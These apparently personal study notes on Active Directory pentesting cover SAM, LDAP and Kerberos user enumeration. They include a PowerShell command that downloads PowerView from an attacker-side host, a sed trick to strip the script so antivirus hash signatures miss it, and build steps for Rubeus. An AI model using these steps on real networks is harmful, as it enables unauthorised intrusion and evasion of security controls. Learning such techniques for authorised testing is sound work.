#      👁️👁️  

## Active Directory

Stores information of resources of a network. <br/>

### Basic Elements

* Forests - The Highest level. Can contain one or more domains.
* Domains - Can contain one or more OU
* Organizational Units - Let apply Group Policies and group permissions

__EVERYTHING IS AN OBJECT!__ <br/>

### SAM - Security Account Manager

Stores information about users, groups and passwords. <br/>

The SAM DB is checked by the __LSA__ Local Security Authority <br/>

SAM is for cached credentials <br/>

We can see them in C:\Users\jhon\Desktop\logonSessions\logonsessions.exe <br/>

NTDS (NT Directory Server)

### LDAP - Lightweight Directory Access Protocol

Is an Application Protocol that lets interact with Directory Services to store, read or modify information. <br/>

__copy from kali linux to windows__ <br/>

>python2 -m SimpleHTTPServer

* The file has to be in our directory where runs the FTP.

* Now run from powershell:

>(New-Object System.NET.WebClient).DownloadFile("http://192.168.20.129:8000/PowerView.ps1", "powerview.ps1")

__run PowerView__ <br/>

AV's by default has a Hash signature, we have to edit the file to skip them: <br/>

* From Kali Linux:

>sed '/<#/,/#>/d' powerview.ps1 > new_powerview.ps1

* From Powershell:

>. .\new_powerview.ps1

### ACL - Access Control List

Lists to manage and control access permitions


### KERBEROS

Authentication Protocol for Active Directory. <br/>

We can use wireshark to scan Kerberos (KRB5) where we can find: <br/>

* AS-REQ (Authentication Service Request) - Sends cname and sname
* KRB Error: KRB5KDC_ERR_PREAUTH_REQUIRED
  * User exists! - DC Requires a cipher Timestamp, otherwise: PRINCIPAL_UNKNOWN
* AS-REP (Authentication Service Reply)
* TGS (Ticket Granted Service)

>We can use kerbrut

>We can use Rubeus

https://github.com/GhostPack/Rubeus <br/>

* Go to __Compile Instructions__
* __Install__ .Net Development Desktop from Visual Studio in the given link.
* Open project (Choose _Rubeus.sln_)
* Select Rubeus folder and go to __Compile__
